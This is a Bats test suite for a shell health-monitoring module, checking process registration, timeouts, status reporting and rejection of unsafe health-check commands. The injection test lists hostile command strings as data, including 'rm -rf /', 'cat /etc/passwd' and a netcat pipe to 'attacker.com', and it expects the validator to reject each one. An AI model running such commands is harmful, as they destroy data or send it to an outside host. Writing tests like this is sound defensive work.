#!/usr/bin/env bats

# health_monitor.bats - NASA-level critical tests for health monitoring
# ZERO TOLERANCE FOR FAILURES - Security and reliability critical

# Test setup
setup() {
    export BATS_TEST_ISOLATED=1
    
    # Load the module under test
    source "src/lib/kernel/health_monitor.sh"
    
    # Mock logging to avoid conflicts
    tlog() { echo "TEST LOG [$1]: $2" >&2; }
    export -f tlog
    
    # Initialize clean test environment
    HEALTH_MONITOR_INITIALIZED=false
    MONITORED_PROCESSES=()
    PROCESS_HEALTH=()
    PROCESS_LAST_CHECK=()
    HEALTH_MONITORS=()
    MONITOR_STATUS=()
    
    # Health status constants (skip setting if already readonly)
    declare -p HEALTH_HEALTHY >/dev/null 2>&1 || HEALTH_HEALTHY="healthy"
    declare -p HEALTH_UNHEALTHY >/dev/null 2>&1 || HEALTH_UNHEALTHY="unhealthy"
    declare -p HEALTH_CRITICAL >/dev/null 2>&1 || HEALTH_CRITICAL="critical"
    declare -p HEALTH_UNKNOWN >/dev/null 2>&1 || HEALTH_UNKNOWN="unknown"
}

teardown() {
    # Clean up test processes
    for pid in "${!MONITORED_PROCESSES[@]}"; do
        # Extract PID from process config
        local process_config="${MONITORED_PROCESSES[$pid]}"
        local actual_pid=$(echo "$process_config" | sed -n 's/.*pid:\([^,]*\).*/\1/p')
        kill -TERM "$actual_pid" 2>/dev/null || true
    done
    
    # Stop all monitors
    for monitor_id in "${!HEALTH_MONITORS[@]}"; do
        MONITOR_STATUS[$monitor_id]="inactive"
    done
    
    # Clean up temp files
    rm -f /tmp/grpctestify_health_test_* 2>/dev/null || true
}

#######################################
# CRITICAL SECURITY TESTS
#######################################

@test "health check command injection is prevented" {
    # Test dangerous commands that should be rejected
    local dangerous_commands=(
        "rm -rf /"
        "echo \$(whoami)"
        "cat /etc/passwd"
        "; rm file"
        "&& malicious_command"
        "| nc attacker.com 4444"
        "> /etc/passwd"
        "\$(evil_command)"
        "\`evil_command\`"
        "command; evil"
        "command && evil"
        "command || evil"
        "command | evil"
    )
    
    # Start a test process
    sleep 60 &
    local test_pid=$!
    
    for dangerous_cmd in "${dangerous_commands[@]}"; do
        # Register process with dangerous health check
        local process_config="pid:$test_pid,monitor:test_monitor,check_cmd:$dangerous_cmd"
        MONITORED_PROCESSES["test_process"]="$process_config"
        
        # Health check should reject dangerous command
        run health_check_process "test_process"
        [ "$status" -eq 0 ]  # Function should not crash
        
        # Health status should be CRITICAL (command rejected)
        [ "${PROCESS_HEALTH[test_process]}" = "$HEALTH_CRITICAL" ]
        
        # Should log security error
        [[ "$output" =~ "unsafe health check command" ]]
    done
    
    # Cleanup
    kill -TERM "$test_pid" 2>/dev/null || true
}

@test "safe health check commands are allowed" {
    local safe_commands=(
        "true"
        "false"
        "test -f /tmp/file"
        "ping -c1 localhost"
        "curl -s http://localhost/health"
        "netstat -an"
        "/usr/bin/check_service"
        "/bin/systemctl status service"
    )
    
    # Start a test process
    sleep 60 &
    local test_pid=$!
    
    for safe_cmd in "${safe_commands[@]}"; do
        # Register process with safe health check
        local process_config="pid:$test_pid,monitor:test_monitor,check_cmd:$safe_cmd"
        MONITORED_PROCESSES["test_process_safe"]="$process_config"
        
        # Health check should accept safe command
        run health_check_process "test_process_safe"
        [ "$status" -eq 0 ]
        
        # Health status should not be CRITICAL (command accepted)
        [ "${PROCESS_HEALTH[test_process_safe]}" != "$HEALTH_CRITICAL" ]
        
        # Should not log security error
        [[ ! "$output" =~ "unsafe health check command" ]]
    done
    
    # Cleanup
    kill -TERM "$test_pid" 2>/dev/null || true
}

@test "health check command timeout is enforced" {
    # Start a test process
    sleep 60 &
    local test_pid=$!
    
    # Register process with slow health check (should timeout)
    local process_config="pid:$test_pid,monitor:test_monitor,check_cmd:sleep 10"
    MONITORED_PROCESSES["timeout_test"]="$process_config"
    
    # Health check should timeout in 5 seconds (not 10)
    local start_time=$(date +%s)
    run health_check_process "timeout_test"
    local end_time=$(date +%s)
    local duration=$((end_time - start_time))
    
    [ "$status" -eq 0 ]
    [ "$duration" -lt 8 ]  # Should complete in under 8 seconds (5s timeout + overhead)
    [ "$duration" -gt 4 ]  # But should take at least 4 seconds
    
    # Health should be unhealthy (timeout = failure)
    [ "${PROCESS_HEALTH[timeout_test]}" = "$HEALTH_UNHEALTHY" ]
    
    # Cleanup
    kill -TERM "$test_pid" 2>/dev/null || true
}

#######################################
# FUNCTIONAL TESTS
#######################################

@test "health monitor initialization is idempotent" {
    run health_monitor_init
    [ "$status" -eq 0 ]
    [ "$HEALTH_MONITOR_INITIALIZED" = "true" ]
    
    # Second initialization should succeed
    run health_monitor_init
    [ "$status" -eq 0 ]
    [ "$HEALTH_MONITOR_INITIALIZED" = "true" ]
}

@test "process registration validates input" {
    # Missing process_id should fail
    run health_monitor_register "" "12345" "test_monitor"
    [ "$status" -eq 1 ]
    [[ "$output" =~ "process_id required" ]]
    
    # Missing PID should fail
    run health_monitor_register "test_process" "" "test_monitor"
    [ "$status" -eq 1 ]
    [[ "$output" =~ "process_pid required" ]]
    
    # Missing monitor should fail
    run health_monitor_register "test_process" "12345" ""
    [ "$status" -eq 1 ]
    [[ "$output" =~ "monitor_id required" ]]
}

@test "process registration validates PID existence" {
    # Try to register non-existent process
    run health_monitor_register "fake_process" "999999" "test_monitor"
    [ "$status" -eq 1 ]
    [[ "$output" =~ "Process PID 999999 does not exist" ]]
}

@test "process health check detects dead processes" {
    # Start and then kill a process
    sleep 60 &
    local test_pid=$!
    
    # Register the process
    run health_monitor_register "dead_test" "$test_pid" "test_monitor"
    [ "$status" -eq 0 ]
    
    # Kill the process
    kill -KILL "$test_pid" 2>/dev/null
    sleep 0.1  # Give time for process to die
    
    # Health check should detect dead process
    run health_check_process "dead_test"
    [ "$status" -eq 0 ]
    [ "${PROCESS_HEALTH[dead_test]}" = "$HEALTH_CRITICAL" ]
    [[ "$output" =~ "is not running" ]]
}

@test "process health check handles missing registrations" {
    # Try to check health of unregistered process
    run health_check_process "nonexistent_process"
    [ "$status" -eq 1 ]
    [[ "$output" =~ "not registered" ]]
}

@test "monitor creation and management works correctly" {
    # Create a monitor
    run health_monitor_create "test_monitor" "10" "30"
    [ "$status" -eq 0 ]
    
    # Verify monitor exists
    [[ -n "${HEALTH_MONITORS[test_monitor]}" ]]
    [ "${MONITOR_STATUS[test_monitor]}" = "active" ]
    
    # Stop the monitor
    run health_monitor_stop "test_monitor"
    [ "$status" -eq 0 ]
    [ "${MONITOR_STATUS[test_monitor]}" = "inactive" ]
}

@test "health status reporting provides accurate information" {
    # Start test processes
    sleep 60 &
    local pid1=$!
    sleep 60 &
    local pid2=$!
    
    # Register processes
    health_monitor_register "healthy_process" "$pid1" "test_monitor"
    health_monitor_register "unhealthy_process" "$pid2" "test_monitor"
    
    # Set different health statuses
    PROCESS_HEALTH["healthy_process"]="$HEALTH_HEALTHY"
    PROCESS_HEALTH["unhealthy_process"]="$HEALTH_UNHEALTHY"
    
    # Get status in different formats
    run health_monitor_status "summary"
    [ "$status" -eq 0 ]
    [[ "$output" =~ "healthy_process" ]]
    [[ "$output" =~ "unhealthy_process" ]]
    
    run health_monitor_status "detailed"
    [ "$status" -eq 0 ]
    [[ "$output" =~ "$HEALTH_HEALTHY" ]]
    [[ "$output" =~ "$HEALTH_UNHEALTHY" ]]
    
    # Cleanup
    kill -TERM "$pid1" "$pid2" 2>/dev/null || true
}

#######################################
# EDGE CASE TESTS
#######################################

@test "concurrent health checks are thread-safe" {
    # Start test processes
    local pids=()
    for i in {1..5}; do
        sleep 60 &
        pids+=("$!")
        health_monitor_register "concurrent_$i" "$!" "test_monitor"
    done
    
    # Run concurrent health checks
    local results=()
    for i in "${!pids[@]}"; do
        {
            health_check_process "concurrent_$i"
            echo $? > "/tmp/grpctestify_health_test_result_$i"
        } &
    done
    
    # Wait for all checks
    wait
    
    # Verify all succeeded
    local success_count=0
    for i in "${!pids[@]}"; do
        if [[ -f "/tmp/grpctestify_health_test_result_$i" ]]; then
            local result=$(cat "/tmp/grpctestify_health_test_result_$i")
            if [[ "$result" -eq 0 ]]; then
                ((success_count++))
            fi
        fi
    done
    
    [ "$success_count" -eq 5 ]
    
    # Cleanup
    for pid in "${pids[@]}"; do
        kill -TERM "$pid" 2>/dev/null || true
    done
}

@test "health monitor handles process lifecycle correctly" {
    # Start a short-lived process
    (sleep 1; exit 42) &
    local short_pid=$!
    
    # Register it
    health_monitor_register "lifecycle_test" "$short_pid" "test_monitor"
    
    # Initial health check (should be healthy)
    health_check_process "lifecycle_test"
    [ "${PROCESS_HEALTH[lifecycle_test]}" = "$HEALTH_HEALTHY" ]
    
    # Wait for process to exit
    sleep 2
    
    # Health check should detect dead process
    health_check_process "lifecycle_test"
    [ "${PROCESS_HEALTH[lifecycle_test]}" = "$HEALTH_CRITICAL" ]
}

@test "monitor unregistration cleans up properly" {
    # Start test process
    sleep 60 &
    local test_pid=$!
    
    # Register process
    health_monitor_register "cleanup_test" "$test_pid" "test_monitor"
    
    # Verify registration
    [[ -n "${MONITORED_PROCESSES[cleanup_test]}" ]]
    
    # Unregister
    run health_monitor_unregister "cleanup_test"
    [ "$status" -eq 0 ]
    
    # Verify cleanup
    [[ -z "${MONITORED_PROCESSES[cleanup_test]}" ]]
    [[ -z "${PROCESS_HEALTH[cleanup_test]}" ]]
    [[ -z "${PROCESS_LAST_CHECK[cleanup_test]}" ]]
    
    # Cleanup
    kill -TERM "$test_pid" 2>/dev/null || true
}

#######################################
# PERFORMANCE TESTS
#######################################

@test "health checks complete within reasonable time" {
    # Start test process
    sleep 60 &
    local test_pid=$!
    
    # Register with simple health check
    local process_config="pid:$test_pid,monitor:test_monitor,check_cmd:true"
    MONITORED_PROCESSES["perf_test"]="$process_config"
    
    # Health check should be fast
    local start_time=$(date +%s%3N)
    run health_check_process "perf_test"
    local end_time=$(date +%s%3N)
    local duration=$((end_time - start_time))
    
    [ "$status" -eq 0 ]
    [ "$duration" -lt 1000 ]  # Should complete in under 1 second (1000ms)
    
    # Cleanup
    kill -TERM "$test_pid" 2>/dev/null || true
}

@test "bulk health checks scale appropriately" {
    local process_count=10
    local pids=()
    
    # Start multiple processes
    for i in $(seq 1 $process_count); do
        sleep 60 &
        local pid=$!
        pids+=("$pid")
        health_monitor_register "bulk_$i" "$pid" "test_monitor"
    done
    
    # Bulk health check
    local start_time=$(date +%s)
    run health_monitor_check_all
    local end_time=$(date +%s)
    local duration=$((end_time - start_time))
    
    [ "$status" -eq 0 ]
    [ "$duration" -lt 10 ]  # Should complete in under 10 seconds for 10 processes
    
    # Cleanup
    for pid in "${pids[@]}"; do
        kill -TERM "$pid" 2>/dev/null || true
    done
}


